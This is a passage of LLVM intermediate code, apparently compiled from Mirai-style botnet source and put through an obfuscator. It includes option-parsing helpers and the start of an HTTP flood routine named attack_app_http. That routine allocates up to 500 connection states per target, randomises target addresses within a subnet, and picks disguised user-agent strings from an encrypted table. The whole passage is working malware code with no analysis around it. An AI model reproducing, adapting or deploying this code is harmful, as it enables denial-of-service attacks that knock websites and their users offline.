  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* %28) #6
  br label %29

; <label>:29:                                     ; preds = %22, %14
  br label %30

; <label>:30:                                     ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = sub i32 %31, 805561651
  %33 = add i32 %32, 1
  %34 = add i32 %33, 805561651
  %35 = add nsw i32 %31, 1
  store i32 %34, i32* %5, align 4
  br label %10

; <label>:36:                                     ; preds = %10
  %37 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %38 = bitcast %struct.attack_option* %37 to i8*
  call void @free(i8* %38) #6
  br label %39

; <label>:39:                                     ; preds = %36, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #3

declare i32 @sleep(i32) #4

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %42

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %44

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = sub i32 0, %36
  %38 = sub i32 0, 1
  %39 = add i32 %37, %38
  %40 = sub i32 0, %39
  %41 = add nsw i32 %36, 1
  store i32 %40, i32* %10, align 4
  br label %11

; <label>:42:                                     ; preds = %11
  %43 = load i8*, i8** %9, align 8
  store i8* %43, i8** %5, align 8
  br label %44

; <label>:44:                                     ; preds = %42, %27
  %45 = load i8*, i8** %5, align 8
  ret i8* %45
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_http_state*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca [10241 x i8], align 16
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.fd_set, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %struct.attack_http_state*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.sockaddr_in, align 4
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %34 = alloca [10240 x i8], align 16
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca i32, align 4
  %51 = alloca i32, align 4
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i32, align 4
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  %62 = alloca i32, align 4
  %63 = alloca i32, align 4
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  store i32 0, i32* %12, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %13, align 8
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i8* @attack_get_opt_str(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 21, i8* null)
  store i8* %66, i8** %14, align 8
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i8* @attack_get_opt_str(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 20, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  store i8* %69, i8** %15, align 8
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i8* @attack_get_opt_str(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 8, i8* null)
  store i8* %72, i8** %16, align 8
  %73 = load i8, i8* %7, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %75 = call i8* @attack_get_opt_str(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i32 0, i32 0))
  store i8* %75, i8** %17, align 8
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 24, i32 1)
  store i32 %78, i32* %18, align 4
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 7, i32 80)
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %19, align 2
  %83 = bitcast [10241 x i8]* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 10241, i32 16, i1 false)
  %84 = load i8*, i8** %16, align 8
  %85 = icmp eq i8* %84, null
  br i1 %85, label %89, label %86

; <label>:86:                                     ; preds = %4
  %87 = load i8*, i8** %17, align 8
  %88 = icmp eq i8* %87, null
  br i1 %88, label %89, label %90

; <label>:89:                                     ; preds = %86, %4
  br label %2895

; <label>:90:                                     ; preds = %86
  %91 = load i8*, i8** %17, align 8
  %92 = call i32 @util_strlen(i8* %91)
  %93 = icmp sgt i32 %92, 255
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %90
  br label %2895

; <label>:95:                                     ; preds = %90
  %96 = load i8*, i8** %16, align 8
  %97 = call i32 @util_strlen(i8* %96)
  %98 = icmp sgt i32 %97, 127
  br i1 %98, label %99, label %100

; <label>:99:                                     ; preds = %95
  br label %2895

; <label>:100:                                    ; preds = %95
  %101 = load i8*, i8** %15, align 8
  %102 = call i32 @util_strlen(i8* %101)
  %103 = icmp sgt i32 %102, 9
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %100
  br label %2895

; <label>:105:                                    ; preds = %100
  store i32 0, i32* %10, align 4
  br label %106

; <label>:106:                                    ; preds = %140, %105
  %107 = load i32, i32* %10, align 4
  %108 = load i8*, i8** %15, align 8
  %109 = call i32 @util_strlen(i8* %108)
  %110 = icmp slt i32 %107, %109
  br i1 %110, label %111, label %146

; <label>:111:                                    ; preds = %106
  %112 = load i8*, i8** %15, align 8
  %113 = load i32, i32* %10, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = sext i8 %116 to i32
  %118 = icmp sge i32 %117, 97
  br i1 %118, label %119, label %139

; <label>:119:                                    ; preds = %111
  %120 = load i8*, i8** %15, align 8
  %121 = load i32, i32* %10, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  %124 = load i8, i8* %123, align 1
  %125 = sext i8 %124 to i32
  %126 = icmp sle i32 %125, 122
  br i1 %126, label %127, label %139

; <label>:127:                                    ; preds = %119
  %128 = load i8*, i8** %15, align 8
  %129 = load i32, i32* %10, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  %132 = load i8, i8* %131, align 1
  %133 = sext i8 %132 to i32
  %134 = add i32 %133, 810052079
  %135 = sub i32 %134, 32
  %136 = sub i32 %135, 810052079
  %137 = sub nsw i32 %133, 32
  %138 = trunc i32 %136 to i8
  store i8 %138, i8* %131, align 1
  br label %139

; <label>:139:                                    ; preds = %127, %119, %111
  br label %140

; <label>:140:                                    ; preds = %139
  %141 = load i32, i32* %10, align 4
  %142 = add i32 %141, -333713673
  %143 = add i32 %142, 1
  %144 = sub i32 %143, -333713673
  %145 = add nsw i32 %141, 1
  store i32 %144, i32* %10, align 4
  br label %106

; <label>:146:                                    ; preds = %106
  %147 = load i32, i32* %18, align 4
  %148 = icmp sgt i32 %147, 500
  br i1 %148, label %149, label %150

; <label>:149:                                    ; preds = %146
  store i32 500, i32* %18, align 4
  br label %150

; <label>:150:                                    ; preds = %149, %146
  call void @table_unlock_val(i8 zeroext 61)
  call void @table_unlock_val(i8 zeroext 62)
  call void @table_unlock_val(i8 zeroext 63)
  call void @table_unlock_val(i8 zeroext 64)
  call void @table_unlock_val(i8 zeroext 65)
  call void @table_unlock_val(i8 zeroext 66)
  call void @table_unlock_val(i8 zeroext 67)
  call void @table_unlock_val(i8 zeroext 68)
  call void @table_unlock_val(i8 zeroext 69)
  call void @table_unlock_val(i8 zeroext 70)
  call void @table_unlock_val(i8 zeroext 71)
  %151 = load i32, i32* %18, align 4
  %152 = sext i32 %151 to i64
  %153 = call noalias i8* @calloc(i64 %152, i64 3140) #6
  %154 = bitcast i8* %153 to %struct.attack_http_state*
  store %struct.attack_http_state* %154, %struct.attack_http_state** %13, align 8
  store i32 0, i32* %9, align 4
  br label %155

; <label>:155:                                    ; preds = %445, %150
  %156 = load i32, i32* %9, align 4
  %157 = load i32, i32* %18, align 4
  %158 = icmp slt i32 %156, %157
  br i1 %158, label %159, label %452

; <label>:159:                                    ; preds = %155
  %160 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %161 = load i32, i32* %9, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %160, i64 %162
  %164 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %163, i32 0, i32 1
  store i8 0, i8* %164, align 4
  %165 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %166 = load i32, i32* %9, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %165, i64 %167
  %169 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %168, i32 0, i32 0
  store i32 -1, i32* %169, align 4
  %170 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %171 = load i32, i32* %9, align 4
  %172 = load i8, i8* %5, align 1
  %173 = zext i8 %172 to i32
  %174 = srem i32 %171, %173
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i64 %175
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i32 0, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %180 = load i32, i32* %9, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %179, i64 %181
  %183 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %182, i32 0, i32 4
  store i32 %178, i32* %183, align 4
  %184 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %185 = load i32, i32* %9, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %187, i32 0, i32 6
  %189 = getelementptr inbounds [257 x i8], [257 x i8]* %188, i32 0, i32 0
  %190 = load i8*, i8** %17, align 8
  %191 = call i32 @util_strcpy(i8* %189, i8* %190)
  %192 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %193 = load i32, i32* %9, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %192, i64 %194
  %196 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %195, i32 0, i32 6
  %197 = getelementptr inbounds [257 x i8], [257 x i8]* %196, i64 0, i64 0
  %198 = load i8, i8* %197, align 4
  %199 = sext i8 %198 to i32
  %200 = icmp ne i32 %199, 47
  br i1 %200, label %201, label %229

; <label>:201:                                    ; preds = %159
  %202 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %203 = load i32, i32* %9, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %202, i64 %204
  %206 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %205, i32 0, i32 6
  %207 = getelementptr inbounds [257 x i8], [257 x i8]* %206, i32 0, i32 0
  %208 = getelementptr inbounds i8, i8* %207, i64 1
  %209 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %210 = load i32, i32* %9, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %209, i64 %211
  %213 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %212, i32 0, i32 6
  %214 = getelementptr inbounds [257 x i8], [257 x i8]* %213, i32 0, i32 0
  %215 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %216 = load i32, i32* %9, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %215, i64 %217
  %219 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %218, i32 0, i32 6
  %220 = getelementptr inbounds [257 x i8], [257 x i8]* %219, i32 0, i32 0
  %221 = call i32 @util_strlen(i8* %220)
  %222 = sext i32 %221 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %208, i8* %214, i64 %222, i32 1, i1 false)
  %223 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %224 = load i32, i32* %9, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %223, i64 %225
  %227 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %226, i32 0, i32 6
  %228 = getelementptr inbounds [257 x i8], [257 x i8]* %227, i64 0, i64 0
  store i8 47, i8* %228, align 4
  br label %229

; <label>:229:                                    ; preds = %201, %159
  %230 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %231 = load i32, i32* %9, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %230, i64 %232
  %234 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %233, i32 0, i32 10
  %235 = getelementptr inbounds [9 x i8], [9 x i8]* %234, i32 0, i32 0
  %236 = load i8*, i8** %15, align 8
  %237 = call i32 @util_strcpy(i8* %235, i8* %236)
  %238 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %239 = load i32, i32* %9, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %238, i64 %240
  %242 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %241, i32 0, i32 9
  %243 = getelementptr inbounds [9 x i8], [9 x i8]* %242, i32 0, i32 0
  %244 = load i8*, i8** %15, align 8
  %245 = call i32 @util_strcpy(i8* %243, i8* %244)
  %246 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %247 = load i32, i32* %9, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %246, i64 %248
  %250 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %249, i32 0, i32 7
  %251 = getelementptr inbounds [129 x i8], [129 x i8]* %250, i32 0, i32 0
  %252 = load i8*, i8** %16, align 8
  %253 = call i32 @util_strcpy(i8* %251, i8* %252)
  %254 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %255 = load i32, i32* %9, align 4
  %256 = load i8, i8* %5, align 1
  %257 = zext i8 %256 to i32
  %258 = srem i32 %255, %257
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %254, i64 %259
  %261 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %260, i32 0, i32 2
  %262 = load i8, i8* %261, align 4
  %263 = zext i8 %262 to i32
  %264 = icmp slt i32 %263, 32
  br i1 %264, label %265, label %298

; <label>:265:                                    ; preds = %229
  %266 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %267 = load i32, i32* %9, align 4
  %268 = load i8, i8* %5, align 1
  %269 = zext i8 %268 to i32
  %270 = srem i32 %267, %269
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %266, i64 %271
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %272, i32 0, i32 1
  %274 = load i32, i32* %273, align 4
  %275 = call i32 @ntohl(i32 %274) #7
  %276 = call i32 @rand_next()
  %277 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %278 = load i32, i32* %9, align 4
  %279 = load i8, i8* %5, align 1
  %280 = zext i8 %279 to i32
  %281 = srem i32 %278, %280
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %277, i64 %282
  %284 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %283, i32 0, i32 2
  %285 = load i8, i8* %284, align 4
  %286 = zext i8 %285 to i32
  %287 = lshr i32 %276, %286
  %288 = sub i32 %275, -650233769
  %289 = add i32 %288, %287
  %290 = add i32 %289, -650233769
  %291 = add i32 %275, %287
  %292 = call i32 @htonl(i32 %290) #7
  %293 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %296, i32 0, i32 4
  store i32 %292, i32* %297, align 4
  br label %298

; <label>:298:                                    ; preds = %265, %229
  %299 = call i32 @rand_next()
  %300 = urem i32 %299, 15
  switch i32 %300, label %436 [
    i32 0, label %301
    i32 1, label %310
    i32 2, label %319
    i32 3, label %328
    i32 4, label %337
    i32 5, label %346
    i32 6, label %355
    i32 7, label %364
    i32 8, label %373
    i32 9, label %382
    i32 10, label %391
    i32 11, label %400
    i32 12, label %409
    i32 13, label %418
    i32 14, label %427
  ]

; <label>:301:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 72)
  %302 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %303 = load i32, i32* %9, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %305, i32 0, i32 5
  %307 = getelementptr inbounds [512 x i8], [512 x i8]* %306, i32 0, i32 0
  %308 = call i8* @table_retrieve_val(i32 72, i32* null)
  %309 = call i32 @util_strcpy(i8* %307, i8* %308)
  call void @table_lock_val(i8 zeroext 72)
  br label %436

; <label>:310:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 73)
  %311 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %314, i32 0, i32 5
  %316 = getelementptr inbounds [512 x i8], [512 x i8]* %315, i32 0, i32 0
  %317 = call i8* @table_retrieve_val(i32 73, i32* null)
  %318 = call i32 @util_strcpy(i8* %316, i8* %317)
  call void @table_lock_val(i8 zeroext 73)
  br label %436

; <label>:319:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 74)
  %320 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %321 = load i32, i32* %9, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %320, i64 %322
  %324 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %323, i32 0, i32 5
  %325 = getelementptr inbounds [512 x i8], [512 x i8]* %324, i32 0, i32 0
  %326 = call i8* @table_retrieve_val(i32 74, i32* null)
  %327 = call i32 @util_strcpy(i8* %325, i8* %326)
  call void @table_lock_val(i8 zeroext 74)
  br label %436

; <label>:328:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 75)
  %329 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %332, i32 0, i32 5
  %334 = getelementptr inbounds [512 x i8], [512 x i8]* %333, i32 0, i32 0
  %335 = call i8* @table_retrieve_val(i32 75, i32* null)
  %336 = call i32 @util_strcpy(i8* %334, i8* %335)
  call void @table_lock_val(i8 zeroext 75)
  br label %436

; <label>:337:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 76)
  %338 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %339 = load i32, i32* %9, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %338, i64 %340
  %342 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %341, i32 0, i32 5
  %343 = getelementptr inbounds [512 x i8], [512 x i8]* %342, i32 0, i32 0
  %344 = call i8* @table_retrieve_val(i32 76, i32* null)
  %345 = call i32 @util_strcpy(i8* %343, i8* %344)
  call void @table_lock_val(i8 zeroext 76)
  br label %436

; <label>:346:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 77)
  %347 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %348 = load i32, i32* %9, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %347, i64 %349
  %351 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %350, i32 0, i32 5
  %352 = getelementptr inbounds [512 x i8], [512 x i8]* %351, i32 0, i32 0
  %353 = call i8* @table_retrieve_val(i32 77, i32* null)
  %354 = call i32 @util_strcpy(i8* %352, i8* %353)
  call void @table_lock_val(i8 zeroext 77)
  br label %436

; <label>:355:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 78)
  %356 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %357 = load i32, i32* %9, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %356, i64 %358
  %360 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %359, i32 0, i32 5
  %361 = getelementptr inbounds [512 x i8], [512 x i8]* %360, i32 0, i32 0
  %362 = call i8* @table_retrieve_val(i32 78, i32* null)
  %363 = call i32 @util_strcpy(i8* %361, i8* %362)
  call void @table_lock_val(i8 zeroext 78)
  br label %436

; <label>:364:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 79)
  %365 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %366 = load i32, i32* %9, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %365, i64 %367
  %369 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %368, i32 0, i32 5
  %370 = getelementptr inbounds [512 x i8], [512 x i8]* %369, i32 0, i32 0
  %371 = call i8* @table_retrieve_val(i32 79, i32* null)
  %372 = call i32 @util_strcpy(i8* %370, i8* %371)
  call void @table_lock_val(i8 zeroext 79)
  br label %436

; <label>:373:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 80)
  %374 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %375 = load i32, i32* %9, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %374, i64 %376
  %378 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %377, i32 0, i32 5
  %379 = getelementptr inbounds [512 x i8], [512 x i8]* %378, i32 0, i32 0
  %380 = call i8* @table_retrieve_val(i32 80, i32* null)
  %381 = call i32 @util_strcpy(i8* %379, i8* %380)
  call void @table_lock_val(i8 zeroext 80)
  br label %436

; <label>:382:                                    ; preds = %298
